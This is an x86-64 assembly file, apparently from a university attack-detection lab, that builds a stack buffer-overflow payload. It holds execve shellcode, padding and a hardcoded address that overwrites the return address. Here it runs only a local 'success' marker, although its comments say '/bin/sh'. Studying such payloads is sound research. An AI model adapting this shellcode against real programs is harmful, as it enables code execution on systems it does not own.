/* victim.c */
/* Author: Zecheng He @ Princeton University */
/* Payload (write to stack) to invoke a shell in victim.c */

#include <sys/syscall.h>

#define BUFFER_PTR_H 0x7fff
#define BUFFER_PTR_L 0xffffe880
#define STRING_LEN 54
#define PAYLOAD_INSTRUCTION_BYTES 61
#define VICTIM_BUFFER_SIZE 128

#define ADD(X, Y) (X + Y)
#define PAD_BYTES (VICTIM_BUFFER_SIZE-PAYLOAD_INSTRUCTION_BYTES-STRING_LEN+8)
#define ARG3_OFFSET (STRING_LEN+1)
#define ARG4_OFFSET (ARG3_OFFSET+8)
#define EXECVE_SYSCALL 59
#define EXIT_SYSCALL 60

.globl main
        .type   main, @function

main:

        xor     %rcx, %rcx
        xor     $BUFFER_PTR_H, %cx
        shl     $32, %rcx

        xor     %rax, %rax
        xor     $ADD(BUFFER_PTR_L, PAYLOAD_INSTRUCTION_BYTES), %eax     /* lower part of ptr to str "/bin/sh" */
        xor     %rax, %rcx                                              /* ptr to str "/bin/sh" */

        xor     %rax, %rax
        mov     %al, STRING_LEN(%rcx)                                   /* Add '\0' to "/bin/sh" */
        movq    %rcx, ARG3_OFFSET(%rcx)                                 /* Ptr to ['/bin/sh'] */
        movq    %rax, ARG4_OFFSET(%rcx)                                 /* NULL pointer */

        mov     $EXECVE_SYSCALL, %al                                    /* syscall arg 1: syscall number execve(59) */
        movq    %rcx, %rdi                                              /* syscall arg 2: string pathname */
        leaq    ARG3_OFFSET(%rcx), %rsi                                 /* syscall arg 3: argv ptr to ['...../success']*/
        xor     %rdx, %rdx                                              /* syscall arg 4: envp (NULL) */
        syscall                                                         /* Call execve("...../success", ["...../success"], []) */

        xor     %rax, %rax
        mov     $EXIT_SYSCALL, %al                                      /* syscall arg 1: SYS_exit (60) */
        xorq    %rdi,%rdi                                               /* syscall arg 2: 0 */
        syscall                                                         /* invoke syscall */

        .ascii  "/home/zechengh/Mastik/ad/attack/bufferoverflow/success"
        .skip   PAD_BYTES, 'a'
        .long   BUFFER_PTR_L                                            /* low part of buffer ptr (the first instruction of payload), will overwrite real return address */
        .long   BUFFER_PTR_H                                            /* high part of buffer ptr (the first instruction of payload), will overwrite real return address */
